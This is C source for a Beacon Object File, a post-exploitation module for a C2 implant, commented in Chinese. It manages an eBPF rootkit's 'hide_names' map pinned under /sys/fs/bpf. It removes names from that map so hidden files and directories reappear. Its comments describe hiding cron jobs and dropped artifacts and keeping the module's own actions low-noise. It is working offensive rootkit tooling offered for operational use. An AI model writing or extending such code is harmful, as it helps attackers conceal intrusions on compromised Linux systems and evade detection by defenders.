/// hide_del.c — BOF: 从 hide_names 里**删回**名字（撤销隐藏 / 回收预算）
///
/// 方案依据：§3.3 P0-3 / 完全体清单 G7 + D2；P8（pin 自动隐藏）的配套回收口。
///
/// Usage:
///   execute bof hide_del.o <pin> <name1> [name2 ...]
///
///   pin:   ebpf_load 加载时用的 pin 名（hide_names 落在 /sys/fs/bpf/<pin>_map0）
///   name…: 要**恢复可见**的 dirent 名（文件名/目录名，不是路径）
///
/// 为什么需要它：hide_names 是 max 32 的 HASH，**没有 LRU、满了不淘汰**，
/// 而且它**活得比一次加载长** —— 只要 rootkit 还挂着，这张表就在，往里写过的
/// 名字也就在。而 MAP_UPDATE 满了只返回 -1，**不区分**"表满"与其它原因，表现
/// 就是"隐藏莫名失灵"（P6 记过同型的静默失效：回执照打 [+]，过滤永远 miss）。
///
/// ★ 同时说清楚**不需要**它做什么：**卸载侧不需要回收**。ebpf_unload 会 unpin 并
/// 关掉全部 fd，map 对象随之释放 —— 在一张**即将被销毁**的表上删键是空操作，
/// 白白多出一个"unpin 前后顺序"的失败面。回收的价值只在**长生命周期**的那张表
/// 上：手工 hide_add 进去的名字（cron 作业名、落地产物名、藏错的名字）没有别的
/// 撤销路径，只能走这里。
///
/// 与 hide_add 对称：key 的构造（64 字节定长、名字在前、NUL 填充到满）同样收敛在
/// agent core（AxHideNameDel → ax_g7_key），此处不自己拼 key。理由见 hide_add.c：
/// 这个格式一旦有第二份实现就会漂移，而漂移的表现是**静默不隐藏**。
///
/// 边界：本命令只删 hide_names 的**键**，不动被隐藏的对象本身。删键之后那个名字
/// 重新出现在目录枚举里 —— 文件/进程一直都在，从来就没被"删"过。
///
/// 边界 2：**要在 <pin>_map0 还活着的时候用**。unpin 之后再想删键，按路径已经打不开
/// 那张 map 了；正确做法是像 ebpf_unload 那样先开 fd、跨过 unpin 再删（见
/// AxHidePinOpen 的注释）。

#include "bof_api.h"

#define HIDE_MAX 32          /* hide_names 的 max_entries */

/* 参数 blob 不保证 NUL 终止（最后一个字段处直接结束），任何交给 path/printf
 * 的字段都必须先拷进有终止的本地缓冲。 */
static int ax_cstr(char *dst, int cap, const char *src, int len) {
    if (!dst || cap <= 0) return 0;
    dst[0] = 0;
    if (!src || len <= 0) return 0;
    if (len > cap - 1) len = cap - 1;
    AxMemcpy(dst, src, len);
    dst[len] = 0;
    return len;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int pin_len = 0;
    char *pin = BeaconDataExtract(&parser, &pin_len);
    char pinbuf[128];
    if (ax_cstr(pinbuf, (int)sizeof(pinbuf), pin, pin_len) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] hide_del: usage: hide_del <pin> <name>...\n");
        return;
    }

    /* 一次开 fd、多次删：逐名走 AxHideNameDel 会开关 10 次 pin 文件，
     * 在 /sys/fs/bpf 上留下一串 open/close 事件，没有必要。 */
    int fd = AxHidePinOpen(pinbuf);
    if (fd < 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] hide_del: no hide_names for pin '%s' (rc=%d)%s\n",
                     pinbuf, fd,
                     fd == -1 ? " — 先跑 ebpf_load，或 <pin>_map0 已被 unpin" : "");
        return;
    }

    int n = 0, miss = 0;
    while (parser.length > 0 && n + miss < HIDE_MAX) {
        int nl = 0;
        char *nm = BeaconDataExtract(&parser, &nl);
        char key[128];
        if (!nm || nl <= 0) break;
        if (ax_cstr(key, (int)sizeof(key), nm, nl) <= 0) break;

        if (AxHideFdDel(fd, key) < 0) {
            /* -ENOENT = 这个键本来就不在。**不当错误**：删一个没藏过的名字是
             * 幂等操作，而且"键不在"与"表打不开"在这里已经分开了（fd 拿到了）。 */
            miss++;
            BeaconPrintf(CALLBACK_OUTPUT, "[.] hide_del: '%s' was not hidden\n", key);
            continue;
        }
        n++;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] hide_del: unhidden '%s'\n", key);
    }

    AxHideFdClose(fd);
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] hide_del: %d name(s) removed from /sys/fs/bpf/%s_map0 (%d not present)\n",
                 n, pinbuf, miss);
}
